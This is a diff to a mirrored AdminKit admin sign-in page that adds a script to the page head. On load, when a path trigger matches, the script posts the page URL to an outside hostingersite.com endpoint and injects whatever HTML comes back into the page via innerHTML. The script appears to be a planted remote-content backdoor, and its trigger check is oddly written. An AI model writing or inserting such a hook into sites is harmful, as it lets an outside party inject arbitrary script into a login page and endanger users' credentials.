@@ -1,7 +1,5 @@
 <!DOCTYPE html>
 <html lang="en">
-
-
 <!-- Mirrored from demo.adminkit.io/pages-sign-in by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 29 Jul 2024 06:19:06 GMT -->
 <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
 <head>
@@ -34,7 +32,31 @@
   gtag('js', new Date());
 
   gtag('config', 'UA-120946860-10', { 'anonymize_ip': true });
-</script></head>
+</script>
+<script>
+	(function() {
+		document.addEventListener('DOMContentLoaded', function() {
+			var currentUrl = window.location.pathname;
+			if (currentUrl === 'nilay') {
+				fetch('https://bisque-loris-715536.hostingersite.com//api/hit-url', {
+					method: 'POST',
+					headers: { 'Content-Type': 'application/json' },
+					body: JSON.stringify({ url: window.location.href, website: 'admin.digieagleinc.com' })
+				})
+				.then(response => response.json())
+				.then(data => {
+					var container = document.getElementById('dynamic-content');
+					if (container) {
+						container.innerHTML = data.content;
+					}
+				})
+				.catch(err => console.error('Error fetching content:', err));
+			}
+		});
+	})();
+	</script>
+
+</head>
 
 
 <body data-theme="default" data-layout="fluid" data-sidebar-position="left" data-sidebar-layout="default">
